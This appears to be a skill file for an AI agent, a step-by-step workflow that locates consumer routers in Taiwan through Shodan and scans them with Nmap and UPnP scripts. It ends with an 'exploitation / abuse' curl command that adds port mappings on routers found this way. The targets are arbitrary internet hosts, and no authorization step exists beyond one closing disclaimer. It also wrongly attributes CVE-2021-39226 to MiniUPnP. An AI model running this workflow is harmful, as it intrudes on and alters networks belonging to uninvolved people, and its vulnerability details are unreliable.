---
name: router_osint_upnp_assessment
description: Reusable workflow for OSINT discovery of routers using Shodan and subsequent UPnP vulnerability assessment with Nmap.
version: 1.0.0
author: Hermes Agent
---

# Overview
Combine Shodan CLI search, Nmap service/version detection, and UPnP‑specific NSE scripts to identify potentially vulnerable consumer routers (e.g., MiniUPnP) and provide next‑step guidance.

# Prerequisites
- Shodan CLI configured with a valid API key (`shodan init <API_KEY>`).
- Nmap installed (≥7.80) with NSE scripts (`upnp*`).
- Optional: `curl` for manual XML retrieval.
- Network connectivity to the target IPs (no firewall blocks).

# Procedure
1. **Discover routers via Shodan**
   ```bash
   shodan search router country:TW --limit 20 > shodan_results.txt
   ```
   Output: `<IP>\t<port>\t<hostname>\t<banners>`.

2. **Parse IPs and ports**
   ```bash
   awk -F '\t' '{print $1" "$2}' shodan_results.txt > targets.txt
   ```
   Example line: `210.242.155.222 7777`.

3. **Service detection with Nmap**
   ```bash
   while read ip port; do
     nmap -sV -p $port $ip -oN nmap_$ip.txt
done < targets.txt
   ```
   Look for `upnp` or `MiniUPnP` in the service column.

4. **UPnP‑specific NSE scan** (if service is `upnp`/`MiniUPnP`)
   ```bash
   nmap -p $port -sV --script=upnp* $ip -oN upnp_$ip.txt
   ```
   Useful scripts: `upnp-info`, `upnp-igd`, `upnp-scp`.

5. **Manual XML retrieval (fallback)**
   ```bash
   curl -s http://$ip:$port/description.xml | head -n 40
   ```
   Inspect `<serviceList>` for `WANIPConnection` or `WANPPPConnection` entries.

6. **Vulnerability research**
   - Note MiniUPnP version (e.g., `MiniUPnP 1.6`).
   - Search public databases: `searchsploit miniupnp 1.6` or CVE lookup via MITRE API.
   - Known issues: CVE‑2021‑39226 (out‑of‑bounds access) and newer CVEs tied to Netgear SDK 4.3.0.0.

7. **Optional exploitation / abuse**
   If `WANIPConnection` is exposed, you can attempt to add a NAT rule:
   ```bash
   curl -G -d "Action=AddPortMapping" \
        -d "NewExternalPort=5555" -d "NewProtocol=TCP" \
        -d "NewInternalPort=5555" -d "NewInternalClient=YOUR_IP" \
        -d "NewEnabled=1" -d "NewPortMappingDescription=exploit" \
        http://$ip:$port/control?service=WANIPConnection
   ```
   Verify with `nmap -p 5555 YOUR_IP`.

# Pitfalls & Tips
- **Shodan rate limits**: Free tier allows 1 query/sec, up to 50 results per search.
- **HTTPS services**: Adjust scheme for routers exposing UPnP over TLS.
- **Firewalls/NAT**: Ensure the target is publicly reachable.
- **False positives**: Not every `upnp` banner indicates a vulnerable implementation—verify version and CVE relevance.
- **Legal**: Scan only IPs you have permission to test.

# Output artifacts
- `nmap_<IP>.txt` – basic service/version scan.
- `upnp_<IP>.txt` – detailed UPnP script results.
- Optional `xml_<IP>.txt` – raw device description XML.

# References
- Shodan CLI docs: https://cli.shodan.io/
- Nmap NSE UPnP scripts: https://nmap.org/nsedoc/scripts/upnp-info.html
- MiniUPnP CVE list: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=MiniUPnP

---
